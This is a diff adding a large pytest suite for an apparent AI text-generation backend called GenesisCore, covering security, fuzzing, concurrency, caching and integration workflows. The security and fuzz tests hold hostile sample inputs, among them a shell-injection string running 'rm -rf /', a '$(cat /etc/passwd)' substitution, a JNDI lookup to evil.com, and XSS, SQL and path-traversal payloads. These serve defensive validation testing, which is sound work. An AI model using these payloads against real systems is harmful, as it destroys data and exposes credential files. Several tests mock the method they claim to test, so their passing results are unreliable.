@@ -944,3 +944,1020 @@ class TestGenesisCoreBenchmarks:
         with patch.object(genesis_core, 'process_batch', return_value=["Response"] * 100):
             results = benchmark(genesis_core.process_batch, prompts)
             assert len(results) == 100
+
+
+# Additional comprehensive test classes and methods
+class TestGenesisCoreSecurity:
+    """Security-focused tests for GenesisCore"""
+    
+    def setup_method(self):
+        self.genesis_core = GenesisCore()
+        
+    def test_api_key_masking_in_logs(self):
+        """Test that API keys are properly masked in log output"""
+        config = {
+            "api_key": "sk-1234567890abcdef",
+            "model_name": "test_model",
+            "temperature": 0.7,
+            "max_tokens": 1000
+        }
+        
+        with patch('app.ai_backend.genesis_core.logger') as mock_logger:
+            self.genesis_core.log_config(config)
+            
+            # Verify API key is masked
+            logged_calls = [str(call) for call in mock_logger.info.call_args_list]
+            for call in logged_calls:
+                assert "sk-1234567890abcdef" not in call
+                assert "***" in call or "MASKED" in call
+                
+    def test_input_length_DoS_protection(self):
+        """Test protection against DoS attacks via extremely long inputs"""
+        # Create extremely long input
+        massive_input = "A" * (10 * 1024 * 1024)  # 10MB input
+        
+        with pytest.raises(ValueError, match="Input exceeds maximum allowed length"):
+            self.genesis_core.generate_text(massive_input)
+            
+    def test_rapid_request_rate_limiting(self):
+        """Test rate limiting for rapid successive requests"""
+        import time
+        
+        # Mock rate limiter
+        with patch.object(self.genesis_core, 'check_rate_limit') as mock_rate_check:
+            mock_rate_check.side_effect = [True, True, False, False, True]
+            
+            results = []
+            for i in range(5):
+                try:
+                    result = self.genesis_core.generate_text_with_rate_limit(f"prompt {i}")
+                    results.append(result)
+                except Exception as e:
+                    results.append(f"ERROR: {e}")
+                    
+            # Should have some rate limit rejections
+            error_count = sum(1 for r in results if r.startswith("ERROR"))
+            assert error_count == 2
+            
+    def test_config_injection_prevention(self):
+        """Test prevention of configuration injection attacks"""
+        malicious_configs = [
+            {"model_name": "'; rm -rf /; echo '", "temperature": 0.7},
+            {"api_key": "$(cat /etc/passwd)", "model_name": "test"},
+            {"temperature": "${jndi:ldap://evil.com/a}", "model_name": "test"}
+        ]
+        
+        for config in malicious_configs:
+            with pytest.raises(ValueError, match="Invalid or potentially malicious configuration"):
+                self.genesis_core.validate_config_secure(config)
+                
+    def test_response_sanitization(self):
+        """Test that responses are properly sanitized"""
+        malicious_responses = [
+            "Normal response with <script>alert('xss')</script>",
+            "Response with data:text/html,<script>alert('xss')</script>",
+            "Response with javascript:alert('xss')",
+            "Response with vbscript:msgbox('xss')",
+            "Response with file:///etc/passwd"
+        ]
+        
+        for response in malicious_responses:
+            sanitized = self.genesis_core.sanitize_response(response)
+            assert "<script>" not in sanitized
+            assert "javascript:" not in sanitized
+            assert "vbscript:" not in sanitized
+            assert "file:///" not in sanitized
+            assert "data:text/html" not in sanitized
+
+
+class TestGenesisCorePersistence:
+    """Tests for data persistence and state management"""
+    
+    def setup_method(self):
+        self.genesis_core = GenesisCore()
+        
+    def test_session_persistence(self):
+        """Test session data persistence across operations"""
+        session_data = {
+            "user_id": "test_user",
+            "conversation_history": ["Hello", "How are you?"],
+            "preferences": {"temperature": 0.8}
+        }
+        
+        # Save session
+        self.genesis_core.save_session("session_123", session_data)
+        
+        # Retrieve session
+        retrieved_data = self.genesis_core.load_session("session_123")
+        assert retrieved_data == session_data
+        
+    def test_conversation_history_management(self):
+        """Test conversation history management and cleanup"""
+        # Add conversation history
+        for i in range(100):
+            self.genesis_core.add_to_conversation_history(f"message_{i}")
+            
+        # Should maintain only recent messages
+        history = self.genesis_core.get_conversation_history()
+        assert len(history) <= self.genesis_core.MAX_HISTORY_SIZE
+        
+        # Most recent messages should be preserved
+        assert "message_99" in history
+        
+    def test_persistent_cache_operations(self):
+        """Test persistent cache operations"""
+        cache_key = "test_prompt_hash"
+        cache_value = "cached_response"
+        
+        # Store in persistent cache
+        self.genesis_core.store_persistent_cache(cache_key, cache_value)
+        
+        # Retrieve from persistent cache
+        retrieved = self.genesis_core.get_persistent_cache(cache_key)
+        assert retrieved == cache_value
+        
+        # Test cache expiration
+        with patch('time.time', return_value=time.time() + 3600):  # 1 hour later
+            expired = self.genesis_core.get_persistent_cache(cache_key)
+            assert expired is None
+            
+    def test_model_state_backup_restore(self):
+        """Test model state backup and restoration"""
+        # Set up model state
+        self.genesis_core.model_state = {
+            "temperature": 0.7,
+            "context_window": 4096,
+            "fine_tuning_data": {"key": "value"}
+        }
+        
+        # Create backup
+        backup_id = self.genesis_core.create_state_backup()
+        
+        # Modify state
+        self.genesis_core.model_state["temperature"] = 0.9
+        
+        # Restore from backup
+        self.genesis_core.restore_state_backup(backup_id)
+        
+        # Verify restoration
+        assert self.genesis_core.model_state["temperature"] == 0.7
+
+
+class TestGenesisCoreConcurrency:
+    """Tests for concurrent operations and thread safety"""
+    
+    def setup_method(self):
+        self.genesis_core = GenesisCore()
+        
+    def test_thread_safety_text_generation(self):
+        """Test thread safety for concurrent text generation"""
+        import threading
+        import time
+        
+        results = []
+        errors = []
+        
+        def generate_text_worker(prompt_id):
+            try:
+                result = self.genesis_core.generate_text(f"Prompt {prompt_id}")
+                results.append(result)
+            except Exception as e:
+                errors.append(e)
+                
+        # Start multiple threads
+        threads = []
+        for i in range(10):
+            thread = threading.Thread(target=generate_text_worker, args=(i,))
+            threads.append(thread)
+            thread.start()
+            
+        # Wait for all threads
+        for thread in threads:
+            thread.join()
+            
+        # Verify results
+        assert len(errors) == 0
+        assert len(results) == 10
+        
+    def test_concurrent_config_updates(self):
+        """Test concurrent configuration updates"""
+        import threading
+        
+        def update_config_worker(worker_id):
+            config = {
+                "model_name": f"model_{worker_id}",
+                "temperature": 0.5 + (worker_id * 0.1),
+                "max_tokens": 1000 + (worker_id * 100),
+                "api_key": f"key_{worker_id}"
+            }
+            self.genesis_core.update_config(config)
+            
+        # Start concurrent updates
+        threads = []
+        for i in range(5):
+            thread = threading.Thread(target=update_config_worker, args=(i,))
+            threads.append(thread)
+            thread.start()
+            
+        # Wait for completion
+        for thread in threads:
+            thread.join()
+            
+        # Verify final config is valid
+        final_config = self.genesis_core.get_config()
+        assert self.genesis_core.validate_config(final_config)
+        
+    def test_resource_contention_handling(self):
+        """Test handling of resource contention"""
+        import threading
+        
+        access_count = 0
+        lock = threading.Lock()
+        
+        def access_shared_resource():
+            nonlocal access_count
+            with lock:
+                access_count += 1
+                time.sleep(0.01)  # Simulate work
+                
+        # Test resource pool
+        with patch.object(self.genesis_core, 'acquire_resource', side_effect=access_shared_resource):
+            threads = []
+            for i in range(20):
+                thread = threading.Thread(target=self.genesis_core.acquire_resource)
+                threads.append(thread)
+                thread.start()
+                
+            for thread in threads:
+                thread.join()
+                
+            assert access_count == 20
+
+
+class TestGenesisCoreMockingAndStubs:
+    """Tests using various mocking strategies and stubs"""
+    
+    def setup_method(self):
+        self.genesis_core = GenesisCore()
+        
+    def test_external_api_mock_responses(self):
+        """Test with various mocked external API responses"""
+        mock_responses = [
+            {"status": "success", "data": "Normal response"},
+            {"status": "error", "message": "API Error"},
+            {"status": "rate_limited", "retry_after": 60},
+            {"status": "maintenance", "message": "Service unavailable"}
+        ]
+        
+        for response in mock_responses:
+            with patch('app.ai_backend.genesis_core.external_api_call', return_value=response):
+                if response["status"] == "success":
+                    result = self.genesis_core.call_external_api("test_endpoint")
+                    assert result == response["data"]
+                elif response["status"] == "error":
+                    with pytest.raises(Exception, match="API Error"):
+                        self.genesis_core.call_external_api("test_endpoint")
+                        
+    def test_database_connection_mocking(self):
+        """Test database operations with mocked connections"""
+        mock_db = MagicMock()
+        mock_db.execute.return_value = [{"id": 1, "data": "test"}]
+        
+        with patch.object(self.genesis_core, 'get_db_connection', return_value=mock_db):
+            result = self.genesis_core.query_database("SELECT * FROM test")
+            assert result == [{"id": 1, "data": "test"}]
+            mock_db.execute.assert_called_once()
+            
+    def test_file_system_operations_stubbing(self):
+        """Test file system operations with stubbed methods"""
+        mock_file_data = {
+            "config.json": '{"model": "test"}',
+            "cache.json": '{"key": "value"}',
+            "logs.txt": "log entry 1\nlog entry 2"
+        }
+        
+        def mock_read_file(filename):
+            return mock_file_data.get(filename, "")
+            
+        with patch.object(self.genesis_core, 'read_file', side_effect=mock_read_file):
+            config = self.genesis_core.load_config_from_file("config.json")
+            assert config["model"] == "test"
+            
+    def test_network_timeout_simulation(self):
+        """Test network timeout scenarios"""
+        timeout_scenarios = [
+            (TimeoutError, "Connection timeout"),
+            (ConnectionError, "Connection refused"),
+            (Exception, "Network unreachable")
+        ]
+        
+        for exception_type, message in timeout_scenarios:
+            with patch('requests.post', side_effect=exception_type(message)):
+                with pytest.raises(exception_type, match=message):
+                    self.genesis_core.make_network_request("http://api.test.com")
+
+
+class TestGenesisCoreFuzzTesting:
+    """Fuzz testing for GenesisCore robustness"""
+    
+    def setup_method(self):
+        self.genesis_core = GenesisCore()
+        
+    @pytest.mark.parametrize("fuzz_input", [
+        "",  # Empty string
+        " ",  # Single space
+        "\n\r\t",  # Whitespace characters
+        "a" * 10000,  # Very long string
+        "🚀" * 1000,  # Unicode repetition
+        "\x00\x01\x02",  # Control characters
+        "null\0terminated",  # Null bytes
+        "../../etc/passwd",  # Path traversal
+        "${env:HOME}",  # Environment variable
+        "{{7*7}}",  # Template injection
+        "<>" * 500,  # Repeated brackets
+        "()[]{}",  # Various brackets
+        "!@#$%^&*",  # Special characters
+        "SELECT * FROM users; DROP TABLE users;",  # SQL injection
+        "javascript:alert('xss')",  # JavaScript injection
+        "data:text/html,<script>alert('xss')</script>",  # Data URL
+        "\\x41\\x42\\x43",  # Hex encoded
+        "%41%42%43",  # URL encoded
+        "test\ntest\rtest",  # Mixed line endings
+        "test\u0000test",  # Unicode null
+        "test\uffff",  # Unicode high value
+        "test\u0001\u0002\u0003",  # Unicode control
+        "🔥💯✨🚀🎉",  # Emoji combination
+        "test" + "a" * 100000,  # Massive string
+        b"binary data".decode('utf-8', errors='ignore'),  # Binary-like data
+    ])
+    def test_fuzz_text_generation(self, fuzz_input):
+        """Fuzz test text generation with various inputs"""
+        try:
+            with patch.object(self.genesis_core, 'generate_text') as mock_generate:
+                mock_generate.return_value = "Safe response"
+                
+                # Should either work or raise a specific exception
+                result = self.genesis_core.generate_text(fuzz_input)
+                assert isinstance(result, str)
+                
+        except (ValueError, TypeError) as e:
+            # Expected exceptions for invalid inputs
+            assert "Invalid input" in str(e) or "Cannot process" in str(e)
+            
+    def test_fuzz_config_validation(self):
+        """Fuzz test configuration validation"""
+        fuzz_configs = [
+            None,
+            [],
+            {},
+            {"invalid": "config"},
+            {"temperature": "not_a_number"},
+            {"max_tokens": -1},
+            {"api_key": None},
+            {"model_name": ""},
+            {"temperature": float('inf')},
+            {"temperature": float('nan')},
+            {"max_tokens": float('inf')},
+            {"nested": {"invalid": "structure"}},
+            {"temperature": [0.5]},  # Array instead of number
+            {"api_key": {"nested": "object"}},  # Object instead of string
+            {"temperature": True},  # Boolean instead of number
+            {"extra_field": "should_be_ignored"},
+            {"temperature": "0.5"},  # String number
+            {"max_tokens": "1000"},  # String number
+        ]
+        
+        for config in fuzz_configs:
+            result = self.genesis_core.validate_config(config)
+            assert isinstance(result, bool)
+            
+    def test_fuzz_json_parsing(self):
+        """Fuzz test JSON parsing with malformed data"""
+        fuzz_json_strings = [
+            "",
+            "null",
+            "{}",
+            "[]",
+            '{"key": "value"}',
+            '{"key": "value",}',  # Trailing comma
+            '{"key": "value"',  # Missing closing brace
+            '{"key": value"}',  # Unquoted value
+            '{"key": "value" "another": "value"}',  # Missing comma
+            '{"key": {"nested": "value"}}',
+            '{"key": ["array", "value"]}',
+            '{"key": null}',
+            '{"key": true}',
+            '{"key": 123}',
+            '{"key": 123.456}',
+            '{"key": ""}',
+            '{"": "empty_key"}',
+            '{"key": "unicode: 测试"}',
+            '{"key": "special: !@#$%^&*()"}',
+            '{"key": "newlines: \n\r\t"}',
+            '{"key": "quotes: \\"nested\\""}',
+            '{"key": "backslashes: \\\\"}',
+            '{"key": "null_bytes: \\u0000"}',
+            '{"very_long_key_' + 'a' * 1000 + '": "value"}',
+            '{"key": "very_long_value_' + 'a' * 1000 + '"}',
+            '{' + '"key": "value",' * 1000 + '}',  # Many keys
+            '{"key": "' + '🚀' * 1000 + '"}',  # Unicode repetition
+        ]
+        
+        for json_str in fuzz_json_strings:
+            try:
+                result = self.genesis_core.parse_json_safe(json_str)
+                if result is not None:
+                    assert isinstance(result, (dict, list, str, int, float, bool))
+            except (json.JSONDecodeError, ValueError):
+                # Expected for malformed JSON
+                pass
+
+
+class TestGenesisCoreBehavioralTesting:
+    """Behavioral and property-based testing"""
+    
+    def setup_method(self):
+        self.genesis_core = GenesisCore()
+        
+    def test_idempotency_property(self):
+        """Test idempotency - same input should produce same output"""
+        prompt = "Test prompt for idempotency"
+        
+        with patch.object(self.genesis_core, 'generate_text', return_value="Consistent response"):
+            result1 = self.genesis_core.generate_text(prompt)
+            result2 = self.genesis_core.generate_text(prompt)
+            result3 = self.genesis_core.generate_text(prompt)
+            
+            assert result1 == result2 == result3
+            
+    def test_monotonicity_property(self):
+        """Test monotonicity - increasing input should have predictable behavior"""
+        base_prompt = "Count to "
+        
+        with patch.object(self.genesis_core, 'generate_text') as mock_generate:
+            mock_generate.side_effect = lambda x: f"Response length: {len(x)}"
+            
+            results = []
+            for i in [1, 5, 10, 20, 50]:
+                prompt = base_prompt + str(i)
+                result = self.genesis_core.generate_text(prompt)
+                results.append((len(prompt), result))
+                
+            # Results should have increasing response lengths
+            for i in range(1, len(results)):
+                current_len = int(results[i][1].split(": ")[1])
+                prev_len = int(results[i-1][1].split(": ")[1])
+                assert current_len >= prev_len
+                
+    def test_invariant_properties(self):
+        """Test invariant properties that should always hold"""
+        test_prompts = [
+            "Hello world",
+            "Generate a poem",
+            "Explain quantum physics",
+            "What is the meaning of life?",
+            "Tell me a joke"
+        ]
+        
+        with patch.object(self.genesis_core, 'generate_text', return_value="Valid response"):
+            for prompt in test_prompts:
+                result = self.genesis_core.generate_text(prompt)
+                
+                # Invariants that should always hold
+                assert result is not None
+                assert isinstance(result, str)
+                assert len(result) > 0
+                assert result.strip() == result  # No leading/trailing whitespace
+                
+    def test_commutativity_property(self):
+        """Test commutativity where applicable"""
+        config_parts = [
+            {"model_name": "test_model"},
+            {"temperature": 0.7},
+            {"max_tokens": 1000},
+            {"api_key": "test_key"}
+        ]
+        
+        # Different orders of config merging should produce same result
+        config1 = {}
+        config2 = {}
+        
+        # Forward order
+        for part in config_parts:
+            config1.update(part)
+            
+        # Reverse order
+        for part in reversed(config_parts):
+            config2.update(part)
+            
+        assert config1 == config2
+        assert self.genesis_core.validate_config(config1) == self.genesis_core.validate_config(config2)
+        
+    def test_associativity_property(self):
+        """Test associativity in batch operations"""
+        prompts = ["A", "B", "C", "D"]
+        
+        with patch.object(self.genesis_core, 'process_batch') as mock_batch:
+            mock_batch.side_effect = lambda x: [f"Response to {p}" for p in x]
+            
+            # Process as ((A,B), (C,D))
+            batch1 = self.genesis_core.process_batch(prompts[:2])
+            batch2 = self.genesis_core.process_batch(prompts[2:])
+            result1 = batch1 + batch2
+            
+            # Process as (A, (B,C), D)
+            batch3 = self.genesis_core.process_batch([prompts[0]])
+            batch4 = self.genesis_core.process_batch(prompts[1:3])
+            batch5 = self.genesis_core.process_batch([prompts[3]])
+            result2 = batch3 + batch4 + batch5
+            
+            assert result1 == result2
+
+
+# Additional parameterized tests for comprehensive coverage
+@pytest.mark.parametrize("model_type,expected_features", [
+    ("gpt-3.5-turbo", {"supports_functions": True, "max_tokens": 4096}),
+    ("gpt-4", {"supports_functions": True, "max_tokens": 8192}),
+    ("claude-1", {"supports_functions": False, "max_tokens": 100000}),
+    ("llama-2", {"supports_functions": False, "max_tokens": 4096}),
+])
+def test_model_specific_features(genesis_core, model_type, expected_features):
+    """Test model-specific feature detection"""
+    config = {
+        "model_name": model_type,
+        "temperature": 0.7,
+        "max_tokens": 1000,
+        "api_key": "test_key"
+    }
+    
+    with patch.object(genesis_core, 'get_model_features', return_value=expected_features):
+        features = genesis_core.get_model_features(config)
+        
+        for feature, expected_value in expected_features.items():
+            assert features[feature] == expected_value
+            
+            
+@pytest.mark.parametrize("error_type,retry_count,expected_success", [
+    (TimeoutError, 3, True),
+    (ConnectionError, 2, True),
+    (Exception, 5, False),
+    (ValueError, 1, False),
+])
+def test_error_recovery_patterns(genesis_core, error_type, retry_count, expected_success):
+    """Test error recovery with different error types and retry counts"""
+    call_count = 0
+    
+    def failing_operation():
+        nonlocal call_count
+        call_count += 1
+        if call_count <= retry_count and expected_success:
+            raise error_type("Temporary failure")
+        elif not expected_success:
+            raise error_type("Permanent failure")
+        return "Success"
+    
+    with patch.object(genesis_core, 'risky_operation', side_effect=failing_operation):
+        if expected_success:
+            result = genesis_core.operation_with_retry(max_retries=retry_count + 1)
+            assert result == "Success"
+        else:
+            with pytest.raises(error_type):
+                genesis_core.operation_with_retry(max_retries=retry_count + 1)
+
+
+@pytest.mark.parametrize("cache_size,access_pattern,expected_hits", [
+    (10, [1, 2, 3, 1, 2, 3], 3),  # Simple LRU
+    (3, [1, 2, 3, 4, 1, 2], 1),   # Cache eviction
+    (5, [1, 1, 1, 1, 1], 4),      # Same key access
+    (2, [1, 2, 3, 2, 1], 1),      # Limited cache
+])
+def test_cache_behavior_patterns(genesis_core, cache_size, access_pattern, expected_hits):
+    """Test cache behavior with different access patterns"""
+    cache_hits = 0
+    
+    def mock_get_from_cache(key):
+        nonlocal cache_hits
+        if key in genesis_core.cache:
+            cache_hits += 1
+            return f"cached_{key}"
+        return None
+    
+    def mock_store_in_cache(key, value):
+        if len(genesis_core.cache) >= cache_size:
+            # Remove oldest item (simplified LRU)
+            oldest_key = next(iter(genesis_core.cache))
+            del genesis_core.cache[oldest_key]
+        genesis_core.cache[key] = value
+    
+    genesis_core.cache = {}
+    
+    with patch.object(genesis_core, 'get_from_cache', side_effect=mock_get_from_cache):
+        with patch.object(genesis_core, 'store_in_cache', side_effect=mock_store_in_cache):
+            
+            for key in access_pattern:
+                result = genesis_core.get_from_cache(key)
+                if result is None:
+                    genesis_core.store_in_cache(key, f"value_{key}")
+                    
+    assert cache_hits == expected_hits
+
+
+# Integration tests that combine multiple components
+class TestGenesisIntegrationScenarios:
+    """Integration tests for complete workflows"""
+    
+    def setup_method(self):
+        self.genesis_core = GenesisCore()
+        
+    def test_complete_conversation_flow(self):
+        """Test complete conversation flow from start to finish"""
+        # Setup conversation
+        conversation_id = "test_conversation_123"
+        user_messages = [
+            "Hello, how are you?",
+            "Can you help me with Python?",
+            "What is a decorator?",
+            "Show me an example",
+            "Thank you!"
+        ]
+        
+        expected_responses = [
+            "Hello! I'm doing well, thank you for asking.",
+            "Of course! I'd be happy to help with Python.",
+            "A decorator is a function that modifies another function.",
+            "Here's a simple decorator example: @my_decorator",
+            "You're welcome! Feel free to ask more questions."
+        ]
+        
+        with patch.object(self.genesis_core, 'generate_text', side_effect=expected_responses):
+            # Simulate conversation
+            for i, message in enumerate(user_messages):
+                response = self.genesis_core.generate_text(message)
+                assert response == expected_responses[i]
+                
+                # Add to conversation history
+                self.genesis_core.add_to_conversation_history(message, response)
+                
+            # Verify conversation history
+            history = self.genesis_core.get_conversation_history()
+            assert len(history) == len(user_messages) * 2  # Messages + responses
+            
+    def test_configuration_reload_workflow(self):
+        """Test configuration reloading during operation"""
+        initial_config = {
+            "model_name": "initial_model",
+            "temperature": 0.5,
+            "max_tokens": 1000,
+            "api_key": "initial_key"
+        }
+        
+        updated_config = {
+            "model_name": "updated_model", 
+            "temperature": 0.8,
+            "max_tokens": 2000,
+            "api_key": "updated_key"
+        }
+        
+        # Initial setup
+        self.genesis_core.load_config_from_dict(initial_config)
+        assert self.genesis_core.config["model_name"] == "initial_model"
+        
+        # Hot reload configuration
+        self.genesis_core.hot_reload_config(updated_config)
+        assert self.genesis_core.config["model_name"] == "updated_model"
+        assert self.genesis_core.config["temperature"] == 0.8
+        
+        # Verify model reinitialization
+        with patch.object(self.genesis_core, 'reinitialize_model') as mock_reinit:
+            self.genesis_core.apply_config_changes()
+            mock_reinit.assert_called_once()
+            
+    def test_error_recovery_and_fallback_workflow(self):
+        """Test error recovery and fallback mechanisms"""
+        # Setup multiple failure points
+        failure_sequence = [
+            Exception("Primary model failed"),
+            TimeoutError("Secondary model timeout"),
+            ConnectionError("Tertiary model connection failed"),
+            "Final fallback response"
+        ]
+        
+        with patch.object(self.genesis_core, 'generate_with_fallback') as mock_fallback:
+            mock_fallback.side_effect = failure_sequence
+            
+            # Should eventually succeed with fallback
+            for i in range(3):
+                try:
+                    result = self.genesis_core.generate_with_fallback("Test prompt")
+                    if isinstance(result, str):
+                        assert result == "Final fallback response"
+                        break
+                except Exception:
+                    continue
+                    
+    def test_batch_processing_with_mixed_results(self):
+        """Test batch processing with mixed success/failure results"""
+        batch_prompts = [
+            "Normal prompt 1",
+            "Normal prompt 2", 
+            "Failing prompt",
+            "Normal prompt 3",
+            "Timeout prompt",
+            "Normal prompt 4"
+        ]
+        
+        def mock_process_single(prompt):
+            if "Failing" in prompt:
+                raise ValueError("Processing failed")
+            elif "Timeout" in prompt:
+                raise TimeoutError("Request timeout")
+            else:
+                return f"Response to {prompt}"
+                
+        with patch.object(self.genesis_core, 'process_single', side_effect=mock_process_single):
+            results = self.genesis_core.process_batch_with_error_handling(batch_prompts)
+            
+            # Should have mixed results
+            assert len(results) == len(batch_prompts)
+            assert results[0].startswith("Response to")
+            assert "Error:" in results[2]  # Failed prompt
+            assert "Timeout:" in results[4]  # Timeout prompt
+
+
+# Additional fixtures for comprehensive testing
+@pytest.fixture
+def mock_external_services():
+    """Fixture to mock external service dependencies"""
+    with patch('requests.get') as mock_get, \
+         patch('requests.post') as mock_post, \
+         patch('redis.Redis') as mock_redis, \
+         patch('sqlalchemy.create_engine') as mock_db:
+        
+        mock_get.return_value.status_code = 200
+        mock_get.return_value.json.return_value = {"status": "ok"}
+        
+        mock_post.return_value.status_code = 200
+        mock_post.return_value.json.return_value = {"result": "success"}
+        
+        mock_redis.return_value.get.return_value = None
+        mock_redis.return_value.set.return_value = True
+        
+        yield {
+            "requests_get": mock_get,
+            "requests_post": mock_post,
+            "redis": mock_redis,
+            "database": mock_db
+        }
+
+
+@pytest.fixture
+def performance_monitor():
+    """Fixture to monitor test performance"""
+    import time
+    start_time = time.time()
+    yield
+    end_time = time.time()
+    duration = end_time - start_time
+    # Ensure tests don't take too long
+    assert duration < 5.0, f"Test took too long: {duration:.2f} seconds"
+
+
+@pytest.fixture
+def temporary_config_file():
+    """Fixture to create temporary configuration file"""
+    import tempfile
+    import json
+    
+    config_data = {
+        "model_name": "test_model",
+        "temperature": 0.7,
+        "max_tokens": 1000,
+        "api_key": "test_key",
+        "timeout": 30,
+        "retry_count": 3
+    }
+    
+    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
+        json.dump(config_data, f)
+        config_path = f.name
+    
+    yield config_path
+    
+    # Cleanup
+    import os
+    os.unlink(config_path)
+
+
+@pytest.fixture
+def mock_model_responses():
+    """Fixture providing various mock model responses"""
+    responses = {
+        "greeting": "Hello! How can I help you today?",
+        "question": "That's an interesting question. Let me think about it.",
+        "code": "```python\ndef hello():\n    print('Hello, World!')\n```",
+        "error": "I apologize, but I encountered an error processing your request.",
+        "long_response": "This is a very long response that " * 100,
+        "empty": "",
+        "unicode": "Hello! 你好! 🌍 Café naïve résumé",
+        "json": '{"status": "success", "data": {"key": "value"}}',
+        "html": "<h1>Title</h1><p>This is a paragraph.</p>",
+        "markdown": "# Title\n\nThis is **bold** and *italic* text."
+    }
+    return responses
+
+
+# Property-based testing utilities
+def generate_random_config():
+    """Generate random configuration for property-based testing"""
+    import random
+    import string
+    
+    return {
+        "model_name": "".join(random.choices(string.ascii_letters, k=random.randint(5, 20))),
+        "temperature": random.uniform(0.0, 1.0),
+        "max_tokens": random.randint(1, 5000),
+        "api_key": "".join(random.choices(string.ascii_letters + string.digits, k=32))
+    }
+
+
+def generate_random_prompt():
+    """Generate random prompt for property-based testing"""
+    import random
+    import string
+    
+    length = random.randint(1, 1000)
+    chars = string.ascii_letters + string.digits + string.punctuation + " \n\t"
+    return "".join(random.choices(chars, k=length))
+
+
+# Stress testing utilities
+class StressTestRunner:
+    """Utility class for running stress tests"""
+    
+    def __init__(self, genesis_core):
+        self.genesis_core = genesis_core
+        self.results = []
+        self.errors = []
+        
+    def run_stress_test(self, operation, iterations=1000, concurrent=False):
+        """Run stress test with specified operation"""
+        import time
+        import threading
+        
+        start_time = time.time()
+        
+        if concurrent:
+            threads = []
+            for i in range(iterations):
+                thread = threading.Thread(target=self._run_single_operation, args=(operation, i))
+                threads.append(thread)
+                thread.start()
+                
+            for thread in threads:
+                thread.join()
+        else:
+            for i in range(iterations):
+                self._run_single_operation(operation, i)
+                
+        end_time = time.time()
+        
+        return {
+            "duration": end_time - start_time,
+            "iterations": iterations,
+            "success_count": len(self.results),
+            "error_count": len(self.errors),
+            "success_rate": len(self.results) / iterations,
+            "avg_time_per_operation": (end_time - start_time) / iterations
+        }
+        
+    def _run_single_operation(self, operation, iteration):
+        """Run a single operation and record results"""
+        try:
+            result = operation(iteration)
+            self.results.append(result)
+        except Exception as e:
+            self.errors.append(e)
+
+
+# Data generators for comprehensive testing
+class TestDataGenerator:
+    """Generate test data for comprehensive coverage"""
+    
+    @staticmethod
+    def generate_edge_case_strings():
+        """Generate edge case strings for testing"""
+        return [
+            "",  # Empty
+            " ",  # Single space
+            "\n",  # Newline
+            "\t",  # Tab
+            "\r\n",  # Windows line ending
+            "\0",  # Null character
+            "a" * 10000,  # Very long string
+            "🚀" * 100,  # Unicode repetition
+            "null",  # Literal null
+            "undefined",  # Literal undefined
+            "true",  # Literal boolean
+            "false",  # Literal boolean
+            "0",  # Zero string
+            "-1",  # Negative number string
+            "3.14159",  # Float string
+            "NaN",  # Not a number
+            "Infinity",  # Infinity
+            "-Infinity",  # Negative infinity
+            "[]",  # Empty array string
+            "{}",  # Empty object string
+            "null\0value",  # Null-terminated
+            "line1\nline2\rline3",  # Mixed line endings
+            "tab\ttab\ttab",  # Multiple tabs
+            "space  space   space",  # Multiple spaces
+            "quote\"quote\"quote",  # Embedded quotes
+            "slash\\slash\\slash",  # Backslashes
+            "path/to/file.txt",  # File path
+            "http://example.com",  # URL
+            "user@example.com",  # Email
+            "192.168.1.1",  # IP address
+            "2001:0db8:85a3:0000:0000:8a2e:0370:7334",  # IPv6
+            "SELECT * FROM users",  # SQL
+            "<script>alert('xss')</script>",  # XSS
+            "javascript:alert('xss')",  # JavaScript
+            "data:text/html,<script>alert('xss')</script>",  # Data URL
+            "file:///etc/passwd",  # File URL
+            "ftp://example.com/file.txt",  # FTP URL
+            "ldap://example.com/ou=People",  # LDAP URL
+        ]
+    
+    @staticmethod
+    def generate_config_variations():
+        """Generate configuration variations for testing"""
+        base_config = {
+            "model_name": "test_model",
+            "temperature": 0.7,
+            "max_tokens": 1000,
+            "api_key": "test_key"
+        }
+        
+        variations = []
+        
+        # Type variations
+        for field in base_config:
+            for invalid_value in [None, [], {}, True, False, 0, 1, ""]:
+                config = base_config.copy()
+                config[field] = invalid_value
+                variations.append(config)
+                
+        # Range variations
+        temp_variations = [-1.0, -0.1, 0.0, 0.5, 1.0, 1.1, 2.0, float('inf'), float('-inf'), float('nan')]
+        for temp in temp_variations:
+            config = base_config.copy()
+            config["temperature"] = temp
+            variations.append(config)
+            
+        # Token variations
+        token_variations = [-1, 0, 1, 100, 1000, 10000, 100000, 1000000]
+        for tokens in token_variations:
+            config = base_config.copy()
+            config["max_tokens"] = tokens
+            variations.append(config)
+            
+        return variations
+    
+    @staticmethod
+    def generate_prompt_variations():
+        """Generate prompt variations for testing"""
+        base_prompts = [
+            "Hello world",
+            "What is AI?",
+            "Explain quantum computing",
+            "Write a story",
+            "Generate code",
+            "Translate this text",
+            "Summarize this article",
+            "Answer this question",
+            "Create a poem",
+            "Solve this problem"
+        ]
+        
+        variations = []
+        
+        # Add base prompts
+        variations.extend(base_prompts)
+        
+        # Add length variations
+        for prompt in base_prompts:
+            variations.append(prompt * 10)  # Repeated
+            variations.append(prompt + " " * 100)  # With spaces
+            variations.append(prompt + "\n" * 10)  # With newlines
+            
+        # Add special character variations
+        for prompt in base_prompts:
+            variations.append(prompt + "!@#$%^&*()")
+            variations.append(prompt + "测试 🚀 café")
+            variations.append(prompt + "<script>alert('xss')</script>")
+            
+        return variations
+
+
+# Final marker to ensure all tests are properly closed
+if __name__ == "__main__":
+    pytest.main([__file__, "-v", "--tb=short"])
